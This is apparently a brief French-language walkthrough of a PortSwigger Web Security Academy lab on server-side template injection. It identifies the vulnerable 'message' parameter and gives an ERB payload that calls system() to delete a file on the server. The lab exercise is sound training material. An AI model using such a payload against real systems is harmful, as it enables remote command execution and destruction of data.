# Lab

https://portswigger.net/web-security/server-side-template-injection/exploiting/lab-server-side-template-injection-basic

## Payload

Sur le premier article, il n'est plus en stock et l'url est : `https://0ab500a003b62d42848dfaec00cf0085.web-security-academy.net/?message=Unfortunately%20this%20product%20is%20out%20of%20stock`

Le paramètre `message` est vulnérable à une SSTI.

Avec le payload `GET /?message=<%= system('rm /home/carlos/morale.txt') %>` on peut supprimer le fichier `morale.txt`.